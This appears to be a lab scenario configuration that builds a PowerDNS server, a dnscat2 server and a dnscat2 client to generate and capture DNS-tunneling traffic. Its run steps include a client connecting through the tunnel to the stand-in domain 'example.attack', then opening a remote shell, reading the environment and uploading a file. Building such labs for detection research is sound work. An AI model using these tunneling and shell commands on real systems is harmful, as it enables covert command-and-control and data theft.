execution_time: 2022-04-01 14:15:57.917019

variables: {}

scenario: {"name": "DNS Tunnel Scenario", "description": "\"This Scenario runs through multiple DNS tunneling \"\n", "provisioner": "vagrant", "use_default_templates": true, "components": [{"name": "PowerDNS", "ipv4_address": "192.168.0.10", "description": "Installation of PowerDNS server.", "image": "ubuntu/focal64", "setup": {"type": "ansible", "val": "powerdns_playbook"}, "run": {"type": "shell", "val": "sudo systemctl restart pdns-recursor;"}, "artifacts_to_collect": [{"type": "pcap", "val": ["tcpdump -i any -s 0 -n -w /tmp/dns.pcap port 53"]}, {"type": "files", "val": ["/var/log/pdns.log", "/tmp/dns.pcap", "/tmp/filebeat.json*"]}, {"type": "filebeat", "val": ["/var/log/pdns.log"]}]}, {"name": "dnscat_server", "ipv4_address": "192.168.0.20", "description": "This sets up the DNSCat2 server.", "image": "ubuntu/focal64", "setup": {"type": "shell", "val": "sudo apt install -y ruby ruby-dev asciinema libtext-lorem-perl; git clone https://github.com/iagox86/dnscat2.git; cd dnscat2/server/; sudo gem install bundler; sudo bundle install; sudo lorem -p 1000 > /root/test-file;"}, "run": {"type": "shell", "val": "echo \"This will be run interactively\"; #vagrant ssh dnscat_server; #asciinema rec /tmp/dnscat_server.cast; #ruby ./dnscat2/server/dnscat2.rb example.attack --secret 1234; #window -i 1; #shell; #ctrl-z; #window -i 2; #whoami; #pwd; #ps aux; #w; #env; #ctrl-z; #window -i 1; #upload /tmp/test-file /tmp/test-file;"}, "artifacts_to_collect": [{"type": "files", "val": ["/tmp/*.cast"]}]}, {"name": "dnscat_client", "ipv4_address": "192.168.0.30", "description": "This sets up the DNSCat2 client.", "image": "ubuntu/focal64", "setup": {"type": "shell", "val": "sudo apt-get install -y asciinema; git clone https://github.com/iagox86/dnscat2.git; cd dnscat2/client/; make;"}, "run": {"type": "shell", "val": "echo \"This will be run interactively\"; #vagrant ssh dnscat_client; #asciinema rec /tmp/dnscat_client.cast; #./dnscat2/client/dnscat --dns server=192.168.0.10,domain=example.attack --secret=1234; #exit;"}, "artifacts_to_collect": [{"type": "files", "val": ["/tmp/*.cast"]}], "depends_on": ["dns_attack_server", "dns_server"]}]}

